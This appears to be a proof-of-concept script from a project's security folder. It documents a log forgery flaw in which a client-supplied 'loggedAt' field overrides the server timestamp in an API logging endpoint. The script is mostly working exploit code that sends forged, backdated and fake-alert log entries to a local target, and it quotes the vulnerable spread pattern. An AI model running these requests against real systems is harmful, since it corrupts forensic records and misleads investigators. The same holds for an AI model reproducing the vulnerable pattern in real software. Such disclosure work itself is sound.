/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║  POC #2 — Log Forgery via Timestamp Override                   ║
 * ║                                                                ║
 * ║  VULNERABILITY: server/providers/openai/debug-log.js L82-87   ║
 * ║  The handler spreads user-controlled JSON AFTER the server-    ║
 * ║  generated loggedAt timestamp:                                 ║
 * ║    { loggedAt: new Date().toISOString(), ...record }           ║
 * ║  A client that includes "loggedAt" in the body OVERWRITES the  ║
 * ║  server timestamp, enabling forensic log forgery.              ║
 * ║                                                                ║
 * ║  IMPACT: High — Destroys forensic log integrity. An attacker   ║
 * ║  can backdate entries to cover tracks, inject future dates     ║
 * ║  to disrupt investigation timelines, or inject arbitrary keys  ║
 * ║  to corrupt log parsing.                                      ║
 * ║                                                                ║
 * ║  HOW TO REPRODUCE: node security/poc/02-log-forgery.mjs       ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */

const TARGET = process.env.TARGET || 'http://localhost:4173';

async function exploit() {
  console.log('=== POC #2: Log Forgery via Timestamp Override ===\n');

  // Attack 1: Backdate a log entry to cover tracks
  console.log('[1] Backdating log entry to 2020-01-01...');
  try {
    const res1 = await fetch(`${TARGET}/api/realtime/log`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        loggedAt: '2020-01-01T00:00:00.000Z', // OVERWRITES server timestamp
        type: 'conversation.item.completed',
        message: 'Legitimate looking entry with forged timestamp',
      }),
    });
    console.log(`  Response: ${res1.status} ${res1.statusText}`);
    if (res1.status === 204) {
      console.log('  ✓ VULNERABLE: Backdated entry written to .gev-logs/realtime-conversations.jsonl');
      console.log('  → Server timestamp OVERWRITTEN by client-supplied value');
    }
  } catch (e) {
    console.log(`  Connection failed: ${e.message}`);
    console.log('  (Start the dev server first: npm run dev)');
    return;
  }

  // Attack 2: Inject arbitrary keys into log records
  console.log('\n[2] Injecting arbitrary keys into log record...');
  try {
    const res2 = await fetch(`${TARGET}/api/realtime/log`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        loggedAt: new Date(Date.now() + 86400000).toISOString(), // Future date
        severity: 'CRITICAL',             // Fake severity field
        source: 'system',                 // Impersonate system events
        __injected: true,                 // Arbitrary key
        alert: 'Server compromised',      // Fake alert to mislead investigators
      }),
    });
    console.log(`  Response: ${res2.status} ${res2.statusText}`);
    if (res2.status === 204) {
      console.log('  ✓ VULNERABLE: Arbitrary keys injected into log record');
      console.log('  → Future-dated entry could disrupt forensic timeline');
      console.log('  → Fake "severity" and "source" fields can mislead analysis');
    }
  } catch (e) {
    console.log(`  Error: ${e.message}`);
  }

  // Attack 3: Inject a newline character in a value to split log lines
  console.log('\n[3] Testing log structure injection...');
  try {
    const res3 = await fetch(`${TARGET}/api/realtime/log`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        loggedAt: '2024-06-15T12:00:00.000Z',
        type: 'session.created',
        message: 'normal entry',
        // JSON.stringify will escape the newline within the value,
        // but the loggedAt override is still the core vulnerability
      }),
    });
    console.log(`  Response: ${res3.status}`);
    if (res3.status === 204) {
      console.log('  ✓ Entry with forged timestamp persisted');
    }
  } catch (e) {
    console.log(`  Error: ${e.message}`);
  }

  console.log('\n=== PROOF ===');
  console.log('Check .gev-logs/realtime-conversations.jsonl');
  console.log('You will see entries with attacker-controlled timestamps,');
  console.log('not the server-generated time. This breaks forensic integrity.');
  console.log('\nVulnerable code (debug-log.js:83-86):');
  console.log('  { loggedAt: new Date().toISOString(), ...record }');
  console.log('  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^');
  console.log('  Server timestamp placed BEFORE spread — client overrides it');
}

exploit().catch(console.error);
